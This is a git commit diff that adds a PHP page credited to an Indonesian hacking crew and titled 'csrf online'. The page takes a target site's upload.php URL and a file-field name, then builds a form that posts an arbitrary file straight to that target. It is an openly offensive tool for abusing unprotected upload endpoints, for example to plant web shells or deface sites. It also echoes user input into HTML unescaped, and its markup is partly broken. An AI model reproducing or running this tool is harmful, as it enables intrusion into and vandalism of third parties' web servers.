ad92e33d9c5c895c5249832c23acff6a38435dd9
JavalandCyberTeam <67801321+JavalandCyberTeam@users.noreply.github.com>
2020-07-05 01:08:04 +0700

    Update and rename README.md to .php

---
+++ .php
@@ -0,0 +1,37 @@
+<html>
+<title>csrf online Javaland Cyber Team</title>
+<head>     <meta charset="utf-8">     <meta name="viewport" content="width=device-width, initial-scale=1.0">     <meta http-equiv="X-UA-Compatible" content="ie-edge">     <link rel="stylesheet">     <center><img width="400px" height="340px" src="https://s7.gifyu.com/images/20200702_200750.png"></center>
+<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script>
+</head>
+<script>
+html {     min-height: 100%;     overflow: hidden;
+} 
+body {     height: calc(100vh - 8em);     padding: 4em;     color: rgba(255, 255, 255, 0.75);     background-color: rgb(25, 25, 25);
+} 
+.garis {     position: relative;     top: 50%;     width: 24em;     margin: 0 auto;     border-right: 2px solid rgba(255, 255, 255, 0.75);     font-size: 180%;     text-align: center;     white-space: nowrap;     overflow: hidden;     transform: translateY(-50%);
+} 
+.animasi-ketikan {     animation: ketikan 4s steps(20) 1s 1 normal both,         kedip 500ms steps(20) infinite normal;
+} 
+@keyframes ketikan {     from {         width: 0;     } to {         width: 9em;     }
+} 
+@keyframes kedip {     from {         border-right-color: rgba(255, 255, 255, 0.75);     } to {         border-right-color: transparent;     }     
+}
+</script>
+<body>
+<body bgcolor='black'>    <center><p class="garis animasi-ketikan"><b><font color="red" shadow="5px" face="courier new"><b>csrf by Farhan Is Real</b><br>thanks to:<br><br>Javaland Cyber Team<br>&<br>Depok X-Ploit</b></p></center><br> 
+<form method="post">
+<center>URL nya beb:" <input type="text" name="url" size="50" height="10" color="white" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
+POST File: <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br>
+<input type="submit" name="d" value="Kunci Target beb:)!!!"></center>
+</form>
+<br><center><?php
+$url = $_POST['url'];
+$pf = $_POST['pf'];
+$d = $_POST['d'];
+if($d) { 	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload Beb:"'></form";
+}
+?></br></center>
+</form>
+</font>
+</body>
+</html>
